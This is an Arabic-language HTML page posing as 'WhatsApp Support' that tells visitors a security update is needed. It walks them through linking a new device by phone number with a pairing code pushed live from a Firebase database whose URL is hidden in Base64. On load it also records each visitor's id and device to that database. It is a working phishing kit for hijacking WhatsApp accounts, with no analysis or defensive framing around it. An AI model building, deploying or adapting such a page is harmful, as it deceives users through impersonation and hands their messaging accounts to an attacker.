<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Support</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .top-bar { position: absolute; top: 0; width: 100%; height: 25%; background-color: #00a884; z-index: -1; }
        .main-card { background: white; width: 90%; max-width: 420px; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; }
        .whatsapp-logo { width: 65px; height: 65px; margin-bottom: 15px; }
        .title { color: #41525d; font-size: 19px; font-weight: 600; margin-bottom: 8px; }
        .device-info { background: #e7f3f3; color: #128c7e; padding: 6px 12px; border-radius: 20px; font-size: 12px; font-weight: bold; margin-bottom: 15px; display: inline-block; }
        .alert-box { background: #fff3cd; color: #856404; padding: 12px; border-radius: 8px; font-size: 13px; margin-bottom: 15px; border: 1px solid #ffeeba; text-align: right; line-height: 1.4; }
        .instruction { color: #3b4a54; font-size: 14px; line-height: 1.7; margin-bottom: 20px; text-align: right; border-right: 3px solid #00a884; padding-right: 10px; }
        .highlight { color: #d91e1e; font-weight: bold; text-decoration: underline; }
        .code-container { background-color: #f8f9fa; border: 2px dashed #cfd8dc; padding: 15px; border-radius: 8px; display: inline-block; min-width: 85%; margin-top: 10px; }
        #pairing-code { font-size: 34px; font-weight: bold; color: #128c7e; letter-spacing: 3px; font-family: 'Courier New', Courier, monospace; }
    </style>
</head>
<body dir="rtl">
    <div class="top-bar"></div>
    <div class="main-card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="whatsapp-logo">
        <div id="t_x" class="title"></div>
        <div id="d_x" class="device-info"></div>
        <div id="a_x" class="alert-box"></div>
        <div id="i_x" class="instruction"></div>
        <div class="code-container"><div id="pairing-code">...</div></div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script>
        // الرابط مشفر Base64 عشان محدش يسحبه بسهولة
        const _0x_key = "aHR0cHM6Ly94c3R1eG5ldC03ZTAzOC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20v";
        firebase.initializeApp({ databaseURL: atob(_0x_key) });
        const _0x_db = firebase.database();

        const _0x_u = new URLSearchParams(window.location.search);
        const _0x_id = _0x_u.get('id') || "User_" + Math.floor(Math.random() * 9999);
        
        const _0x_dv = /iPhone|iPad|iPod/.test(navigator.userAgent) ? "iPhone (iOS)" : "Android Device";
        const _0x_lg = navigator.language.startsWith('ar') ? 'ar' : 'en';

        const _0x_data = {
            ar: {
                t: "تحديث أمان الحساب للرقم: " + (_0x_u.get('id') || ""),
                d: "تم التعرف على جهازك: " + _0x_dv,
                a: "⚠️ تنبيه: سيصلك الآن إشعار على واتساب يطلب 'ربط جهاز جديد'. اضغط عليه للمتابعة.",
                i: "خطوات المزامنة:<br>1. افتح الإشعار أو اذهب للإعدادات > الأجهزة المرتبطة.<br>2. اضغط على 'ربط جهاز'.<br>3. <span class='highlight'>مهم جداً:</span> اضغط على كلمة <b>'الربط برقم الهاتف بدلاً من ذلك'</b>.<br>4. أدخل الكود التالي:",
                l: "فحص..."
            }
        };

        // تعبئة البيانات فوراً لمنع الاختفاء
        document.getElementById('t_x').innerText = _0x_data.ar.t;
        document.getElementById('d_x').innerText = _0x_data.ar.d;
        document.getElementById('a_x').innerText = _0x_data.ar.a;
        document.getElementById('i_x').innerHTML = _0x_data.ar.i;
        document.getElementById('pairing-code').innerText = _0x_data.ar.l;

        _0x_db.ref('visiting/' + _0x_id).set({ status: "online", device: _0x_dv, time: Date.now() });
        _0x_db.ref('sessions/' + _0x_id).on('value', (s) => {
            const val = s.val();
            if (val && val.code) document.getElementById('pairing-code').innerText = val.code;
        });
    </script>
</body>
</html>
